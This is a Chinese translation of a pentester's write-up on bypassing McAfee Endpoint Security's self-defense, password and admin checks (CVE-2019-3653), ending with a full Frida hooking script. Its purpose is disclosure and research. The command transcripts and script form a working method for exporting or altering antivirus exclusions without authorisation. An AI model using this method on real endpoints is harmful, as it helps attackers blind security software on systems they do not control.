> 原文链接: https://www.anquanke.com//post/id/188786 


# 以彼之道还施彼身：如何绕过McAfee防护机制


                                阅读量   
                                **592453**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者dmaasland，文章来源：dmaasland.github.io
                                <br>原文地址：[https://dmaasland.github.io/posts/mcafee.html](https://dmaasland.github.io/posts/mcafee.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p2.ssl.qhimg.com/t01df4954f0681de12d.jpg)](https://p2.ssl.qhimg.com/t01df4954f0681de12d.jpg)



## 0x00 前言

在之前的渗透测试中，当我们碰到McAfee Virus Scan Enterprise（VSE）时都会会心一笑，当时只要简单查询注册表，就能知道管理员创建的扫描例外项。

然而在这次渗透测试中，情况稍微有点复杂，因为目标使用的是McAfee Endpoint Security。现在McAfee已经不再将扫描例外信息以明文存储在某个位置，我们无法轻松读取这些信息。

那么现在我们该何去何从呢？

本文介绍了我如何使用McAfee工具来绕过McAfee Endpoint Security产品。



## 0x01 ESConfigTool

McAfee Endpoint Security产品在安装时会附带名为“ESConfigTool”的一个程序，该程序可以用来导入导出配置文件，详细用法可参考[此处文档](https://docs.mcafee.com/bundle/endpoint-security-10.6.0-installation-guide-unmanaged-windows/page/GUID-31F0BE99-2186-4C4E-B0E3-96F3FED8DF49.html)。

为了获取McAfee Endpoint Security的配置信息，我们需要满足如下条件：
- 解锁密码
- 管理员权限
然而我们都没有掌握这些条件。

我下载了试用版的McAfee Endpoint Security，想进一步研究一下。

[![](https://p5.ssl.qhimg.com/t01cc4849402d1fcc9c.png)](https://p5.ssl.qhimg.com/t01cc4849402d1fcc9c.png)



## 0x02 逆向分析

现在事情开始有点棘手，我在逆向分析方面经验不足，与毛猴子无异，只能碰碰运气。

因此，让我们可以从头开始，做一下实验。我创建了如下3个例外项目：
- `C:\Windows\Temp\`
- `*mimikatz.exe`
- `C:\TotallyLegit\`
[![](https://p0.ssl.qhimg.com/t01401d14866f4dffea.png)](https://p0.ssl.qhimg.com/t01401d14866f4dffea.png)

使用密码方式来保护这些设置，密码为`starwars`。

[![](https://p0.ssl.qhimg.com/t01ff40c5ddad7550f5.png)](https://p0.ssl.qhimg.com/t01ff40c5ddad7550f5.png)

现在打开管理员命令提示符，看能否提取这些设置信息。

```
Microsoft Windows [Version 10.0.16299.15]
(c) 2017 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;"C:\Program Files\McAfee\Endpoint Security\Endpoint Security Platform\ESConfigTool.exe" /export C:\Export.xml /module TP /unlock starwars /plaintext
Command executed successfully. Please refer to Endpoint Security logs for details

C:\Windows\system32&gt;
```

打开生成的XML，看是否能找到我们的例外项：

```
&lt;EXCLUSION_ITEMS&gt;
    &lt;EXCLUSION_ITEM&gt;
        &lt;EXCLUSION_BY_NAME_OR_LOCATION&gt;C:\Windows\Temp\&lt;/EXCLUSION_BY_NAME_OR_LOCATION&gt;
        &lt;EXCLUSION_FILE_TYPE /&gt;
        &lt;EXCLUSION_BY_FILE_AGE&gt;0&lt;/EXCLUSION_BY_FILE_AGE&gt;
        &lt;EXCLUSION_TYPE&gt;3&lt;/EXCLUSION_TYPE&gt;
        &lt;EXCLUSION_EXCLUDE_SUBFOLDERS&gt;1&lt;/EXCLUSION_EXCLUDE_SUBFOLDERS&gt;
        &lt;EXCLUSION_ON_READ&gt;1&lt;/EXCLUSION_ON_READ&gt;
        &lt;EXCLUSION_ON_WRITE&gt;1&lt;/EXCLUSION_ON_WRITE&gt;
        &lt;EXCLUSION_SOURCE&gt;0&lt;/EXCLUSION_SOURCE&gt;
    &lt;/EXCLUSION_ITEM&gt;
    &lt;EXCLUSION_ITEM&gt;
        &lt;EXCLUSION_BY_NAME_OR_LOCATION&gt;**\*mimikatz.exe&lt;/EXCLUSION_BY_NAME_OR_LOCATION&gt;
        &lt;EXCLUSION_FILE_TYPE /&gt;
        &lt;EXCLUSION_BY_FILE_AGE&gt;0&lt;/EXCLUSION_BY_FILE_AGE&gt;
        &lt;EXCLUSION_TYPE&gt;3&lt;/EXCLUSION_TYPE&gt;
        &lt;EXCLUSION_EXCLUDE_SUBFOLDERS&gt;0&lt;/EXCLUSION_EXCLUDE_SUBFOLDERS&gt;
        &lt;EXCLUSION_ON_READ&gt;1&lt;/EXCLUSION_ON_READ&gt;
        &lt;EXCLUSION_ON_WRITE&gt;1&lt;/EXCLUSION_ON_WRITE&gt;
        &lt;EXCLUSION_SOURCE&gt;0&lt;/EXCLUSION_SOURCE&gt;
    &lt;/EXCLUSION_ITEM&gt;
    &lt;EXCLUSION_ITEM&gt;
        &lt;EXCLUSION_BY_NAME_OR_LOCATION&gt;C:\TotallyLegit\&lt;/EXCLUSION_BY_NAME_OR_LOCATION&gt;
        &lt;EXCLUSION_FILE_TYPE /&gt;
        &lt;EXCLUSION_BY_FILE_AGE&gt;0&lt;/EXCLUSION_BY_FILE_AGE&gt;
        &lt;EXCLUSION_TYPE&gt;3&lt;/EXCLUSION_TYPE&gt;
        &lt;EXCLUSION_EXCLUDE_SUBFOLDERS&gt;1&lt;/EXCLUSION_EXCLUDE_SUBFOLDERS&gt;
        &lt;EXCLUSION_ON_READ&gt;1&lt;/EXCLUSION_ON_READ&gt;
        &lt;EXCLUSION_ON_WRITE&gt;1&lt;/EXCLUSION_ON_WRITE&gt;
        &lt;EXCLUSION_SOURCE&gt;0&lt;/EXCLUSION_SOURCE&gt;
    &lt;/EXCLUSION_ITEM&gt;
&lt;/EXCLUSION_ITEMS&gt;
```

非常好！但这是我们使用管理员权限、配合正确的密码才得到的结果。我们可以attach调试器，看一下后台的工作流程。



## 0x03 自我保护

通常情况下，attach调试器是比较简单的一个过程，只需要打开调试器、选择目标程序、再添加一些命令行参数即可。然而由于我们面对的是一款安全解决方案，因此会面临一些阻碍。这里有个比较大的问题，McAfee的组件都受该产品的“自我保护”功能的防护。如果我们尝试attach调试器，就会看到“Debugging stopped”错误消息，McAfee也会在Self Defense日志文件中记录这些操作。

[![](https://p0.ssl.qhimg.com/t017af0b3890261be7a.png)](https://p0.ssl.qhimg.com/t017af0b3890261be7a.png)

```
12/10/2019 12:47:09   mfeesp(2204.6392) &lt;SYSTEM&gt; ApBl.SP.Activity: DESKTOP-DNUK2R5\admin ran X64DBG.EXE, which attempted to access ESCONFIGTOOL.EXE, violating the rule "Core Protection - Protect McAfee processes from unauthorized access and termination", and was blocked. For information about how to respond to this event, see KB85494.
12/10/2019 12:47:09   mfeesp(2204.5404) &lt;SYSTEM&gt; ApBl.SP.Activity: DESKTOP-DNUK2R5\admin ran X64DBG.EXE, which attempted to access ESCONFIGTOOL.EXE, violating the rule "Core Protection - Protect McAfee processes from unauthorized access and termination", and was blocked. For information about how to respond to this event, see KB85494.
```

经过一些尝试和错误后，我找到了能够绕过Self Defense机制的一种方法，也就是所谓的“Super 1337, z3r0 d4y, APT-style nation state”技术（翻译过来就是diao炸天技术）。请看如下操作：

```
Microsoft Windows [Version 10.0.16299.15]
(c) 2017 Microsoft Corporation. All rights reserved.

C:\Users\admin&gt;mkdir \temp

C:\Users\admin&gt;cd \temp

C:\temp&gt;copy "C:\Program Files\McAfee\Endpoint Security\Endpoint Security Platform\ESConfigTool.exe" .
        1 file(s) copied.

C:\temp&gt;copy "C:\Program Files\McAfee\Endpoint Security\Endpoint Security Platform\blframework.dll" .
        1 file(s) copied.

C:\temp&gt;copy "C:\Program Files\McAfee\Endpoint Security\Endpoint Security Platform\EpSecApiLib.dll" .
        1 file(s) copied.

C:\temp&gt;copy "C:\Program Files\McAfee\Endpoint Security\Endpoint Security Platform\McVariantExport.dll" .
        1 file(s) copied.

C:\temp&gt;copy "C:\Program Files\McAfee\Endpoint Security\Endpoint Security Platform\LogLib.dll" .
        1 file(s) copied.

C:\temp&gt;
```

就这么简单？的确如此！我们甚至不需要管理员权限。任何普通用户都可以执行该操作。现在我们可以attach调试器，开始分析：

[![](https://p5.ssl.qhimg.com/t017dcdeaac3598e0c5.png)](https://p5.ssl.qhimg.com/t017dcdeaac3598e0c5.png)

那现在该怎么继续处理呢？



## 0x04 绕过密码检查

来看一下当使用错误密码时会出现哪些情况。这里可能会出现一些字符串，帮我们定位：

```
C:\Windows\system32&gt;"C:\Program Files\McAfee\Endpoint Security\Endpoint Security Platform\ESConfigTool.exe" /export C:\Export.xml /module TP /unlock startrek /plaintext
There were some errors while executing command. Please refer to Endpoint Security logs for details

C:\Windows\system32&gt;
```

看上去错误信息比较空泛，但McAfee的日志文件可以提供更多的信息：

```
10/12/2019 01:11:46.400 PM ESConfigTool(5476.8840) &lt;admin&gt; ESConfigTool.ESConfigTool.Error (ImportExportUtil.cpp:677): Failed to unlock client settings with user supplied password, TriggerAction failed
```

我们可以在调试器中搜索字符串，判断该错误的位置。

[![](https://p0.ssl.qhimg.com/t0178bbcebb584b9485.png)](https://p0.ssl.qhimg.com/t0178bbcebb584b9485.png)

非常好，如果在此处设置断点，再次运行就可以触发断点。如果我们分析触发断点前的逻辑，可以看到目标调用了一个`BLInvokeMethod`函数，然后执行了某次跳转，但我们在输错密码时并不会执行该跳转：

[![](https://p1.ssl.qhimg.com/t016784102678440e2d.png)](https://p1.ssl.qhimg.com/t016784102678440e2d.png)

此时我们需要做一些选择：

1、深入分析密码检查函数，判断函数逻辑，然后尝试破解密码；

2、让密码函数顺利运行，修改函数返回值。

由于我的懒惰天性，我选择第2种方案。当输入错误密码时，密码检查函数会在`RAX`寄存器中存储一个错误值：

[![](https://p1.ssl.qhimg.com/t01e857458ac0091762.png)](https://p1.ssl.qhimg.com/t01e857458ac0091762.png)

如果提供正确的密码，`RAX`寄存器的值为`0`：

[![](https://p4.ssl.qhimg.com/t019f90a3943f2dfc98.png)](https://p4.ssl.qhimg.com/t019f90a3943f2dfc98.png)

因此，如果我们提供错误的密码，在密码检查函数上设置断点，然后将`RAX`寄存器值改为`0`会怎么样？来试一下。

[![](https://p3.ssl.qhimg.com/t01ac2fa51e03ee4767.png)](https://p3.ssl.qhimg.com/t01ac2fa51e03ee4767.png)

显然非常顺利。

[![](https://p2.ssl.qhimg.com/t01e92d7921ec098d46.png)](https://p2.ssl.qhimg.com/t01e92d7921ec098d46.png)

事实证明密码检查逻辑只由该工具本身来负责，我们并不需要解密或者导出实际的配置。接下来让我们解决另一个问题。



## 0x05 绕过管理员检查

虽然输入错误密码时我们能看到比较清晰的错误提示，但如果没有以管理员权限运行该工具，我们只能看到帮助信息：

```
Microsoft Windows [Version 10.0.16299.15]
(c) 2017 Microsoft Corporation. All rights reserved.

C:\Users\user&gt;"C:\Program Files\McAfee\Endpoint Security\Endpoint Security Platform\ESConfigTool.exe" /export C:\temp\Export.xml /module TP /unlock starwars /plaintext
Description:
      Endpoint security configuration tool for exporting and importing policy configuration. User needs administrator privileges to run this utility. Utility needs password if the client interface is password protected. File supplied for import must be an encrypted file.

USAGE:
      ESConfigTool.exe /export &lt;filename&gt; [/module &lt;TP|FW|WC|ESP&gt; ] [/unlock &lt;password&gt; ] [/plaintext ]

      ESConfigTool.exe /import &lt;filename&gt; [/module &lt;TP|FW|WC|ESP&gt; ] [/unlock &lt;password&gt; ] [/policyname &lt;name&gt; ]

      ESConfigTool.exe /help

C:\Users\user&gt;
```

日志里面也没有信息。

那么我们如何知道管理员检查的具体机制？我们可以以普通用户权限运行调试器来分析一下，此时发现目标会调用一个函数，在返回值上执行字符串比较操作，如果返回代码不等于`0`，则会调用`exit`。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01127de18096100903.png)

如果跟进该函数，最终可以找到一个函数：[AllocateAndInitializeSid](https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-allocateandinitializesid)。这些过程都比较蛋疼，不值得专门花时间逆向分析。我们可以试一下偷懒的方法，直接修改返回值。

进一步分析，我们发现返回值检查逻辑位于此处：

[![](https://p4.ssl.qhimg.com/t01943f07a55a593be6.png)](https://p4.ssl.qhimg.com/t01943f07a55a593be6.png)

这里我们直接把返回值设置为`0`：

[![](https://p5.ssl.qhimg.com/t01b6e19771752bb12d.png)](https://p5.ssl.qhimg.com/t01b6e19771752bb12d.png)

结果依然非常顺利！

[![](https://p5.ssl.qhimg.com/t014b762bc2465e61c8.png)](https://p5.ssl.qhimg.com/t014b762bc2465e61c8.png)

现在我们可以在受限权限且不知道正确密码的情况下，从McAfee Endpoint Security中导出配置信息。



## 0x06 自动化操作

目前的进展非常顺利，然而如果每次都需要attach调试器，手动修改返回值，显然是非常痛苦的操作。幸运的是，[Frida](https://www.frida.re/)可以提供援手。如果大家不熟悉Frida，建议了解一下。该工具可以帮我们做很多操作，比如hook函数、修改返回值等，我们只需要了解JavaScript就能完成这些任务。

但是我们如何将Frida注入McAfee呢？非常简单，使用[frida-server](https://github.com/frida/frida/releases/download/12.7.9/frida-server-12.7.9-windows-x86_64.exe.xz)即可。我们可以在运行McAfee的主机上打开该工具，然后使用Python发起连接。

**McAfee目标主机：**

```
Microsoft Windows [Version 10.0.16299.15]
(c) 2017 Microsoft Corporation. All rights reserved.

C:\Users\admin&gt;cd \temp

C:\temp&gt;frida-server-12.7.9-windows-x86_64.exe
```

**Python主机：**

```
Python 3.6.7 (default, Oct 22 2018, 11:32:17) 
[GCC 8.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; import frida
&gt;&gt;&gt; devmgr = frida.get_device_manager()
&gt;&gt;&gt; devmgr.add_remote_device('192.168.31.150')
Device(id="tcp@192.168.31.150", name="192.168.31.150", type='remote')
&gt;&gt;&gt; rdev = frida.get_device('tcp@192.168.31.150')
&gt;&gt;&gt; args = [
...   'ESConfigTool.exe',
...   '/export',
...   'frida-export.xml',
...   '/module',
...   'ESP',
...   '/unlock',
...   'startrek',
...   '/plaintext'
... ]
&gt;&gt;&gt; pid = rdev.spawn(args)
&gt;&gt;&gt; session = rdev.attach(pid)
&gt;&gt;&gt; session
Session(pid=11168)
```

成功连接，且`ESConfigTool.exe`处于运行状态！

[![](https://p5.ssl.qhimg.com/t01d2e6f973d1e7844d.png)](https://p5.ssl.qhimg.com/t01d2e6f973d1e7844d.png)

现在我们可以将JavaScript代码注入`ESConfigTool`进程中。



## 0x07 Frida脚本

这里我就不详细介绍如何创建该脚本，本文已经介绍了足够多的背景信息，这里我直接给出完整脚本：

```
const configBase = Module.findBaseAddress('ESConfigTool.exe');
//const adminCheck = configBase.add(0x5240); //32
const adminCheck = configBase.add(0x5f30); //64
const BLInvokeMethod = Module.findExportByName('blframework.dll','BLInvokeMethod')

console.log('[-] Base address is:',configBase);
console.log('[-] Admin check is:',adminCheck);
console.log('[-] BLInvokeMethod:',BLInvokeMethod);

Interceptor.attach(adminCheck, `{`
  onEnter: function (args) `{`
    console.log('[+] Hooked admin check function');
  `}`,
  onLeave: function (retval) `{`
    console.log('[+] Returning true for admin check');
    retval.replace(1);
  `}`
`}`);

Interceptor.attach(BLInvokeMethod, `{`
  onEnter: function (args) `{`
    console.log('[+] Hooked BLInvokeMethod function');
  `}`,
  onLeave: function (retval) `{`
    console.log('[+] Patching password check function');
    retval.replace(0x0);
  `}`
`}`);
```

脚本的逻辑与我们在调试器中手动执行的逻辑一致，会修改返回值。让我们注入脚本，观察是否能成功执行：

```
&gt;&gt;&gt; script = """
... const configBase = Module.findBaseAddress('ESConfigTool.exe');
... //const adminCheck = configBase.add(0x5240); //32
... const adminCheck = configBase.add(0x5f30); //64
... const BLInvokeMethod = Module.findExportByName('blframework.dll','BLInvokeMethod')
... 
... console.log('[-] Base address is:',configBase);
... console.log('[-] Admin check is:',adminCheck);
... console.log('[-] BLInvokeMethod:',BLInvokeMethod);
... 
... Interceptor.attach(adminCheck, `{`
...   onEnter: function (args) `{`
...     console.log('[+] Hooked admin check function');
...   `}`,
...   onLeave: function (retval) `{`
...     console.log('[+] Returning true for admin check');
...     retval.replace(1);
...   `}`
... `}`);
... 
... Interceptor.attach(BLInvokeMethod, `{`
...   onEnter: function (args) `{`
...     console.log('[+] Hooked BLInvokeMethod function');
...   `}`,
...   onLeave: function (retval) `{`
...     console.log('[+] Patching password check function');
...     retval.replace(0x0);
...   `}`
... `}`);
... 
... """
&gt;&gt;&gt; session.create_script(script).load()
[-] Base address is: 0x7ff73ed30000
[-] Admin check is: 0x7ff73ed35f30
[-] BLInvokeMethod: 0x7ffa4d759730
&gt;&gt;&gt; rdev.resume(pid)
&gt;&gt;&gt; [+] Hooked admin check function
[+] Returning true for admin check
[+] Hooked BLInvokeMethod function
[+] Patching password check function

&gt;&gt;&gt;
```

事实证明非常顺利：

[![](https://p0.ssl.qhimg.com/t012c6fbacbafce7ec6.png)](https://p0.ssl.qhimg.com/t012c6fbacbafce7ec6.png)

> 虽然命令提示符中显示的是`admin`用户，但我并没有允许UAC弹窗。请相信我普通用户就能完成该任务。



## 0x08 后续操作

我们最终得到了扫描例外项目信息。由于该过程通过TCP连接完成，因此我也成功通过Cobalt Strike beacon完成该操作。

即使本文中我们只分析了如何导出该信息，但其实我们也可以**导入**配置文件。这意味着我们可以添加自己的例外项，修改其他设置，甚至删除密码等。

这里要稍微提一下`/plaintext`参数，这个参数有点“神经刀”。有时候能正常工作，有时候却不行。可能不同的版本性需要使用不同的函数偏移量？我并不确定。这里我不想进一步研究，因为即使McAfee向我们提供了不加此参数的加密配置，我们也可以将加密配置直接载入试用版产品中。

另外，配置信息究竟如何加密？这是另一个话题。当McAfee PSIRT（Product Security Incident Response Team）修复该问题后，我会提供一些信息。



## 0x09 缓解机制

McAfee PSIRT公布了一个[安全公告](https://kc.mcafee.com/corporate/index?page=content&amp;id=SB10299)，修复了该问题，分配的漏洞编号为[CVE-2019-3653](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-3653)。这里我并没有测试漏洞是否已被修复，毕竟自己太懒了。

我还有另一个想法：即使官方修复了ESConfigTool中的问题，我们能否使用早期版本的工具，在新版的McAfee Endpoint Protection上继续利用？这个工作留给大家完成，我上传了一个python [PoC脚本](https://github.com/dmaasland/mcfridafee/blob/master/mcafee.py)，欢迎大家尝试。
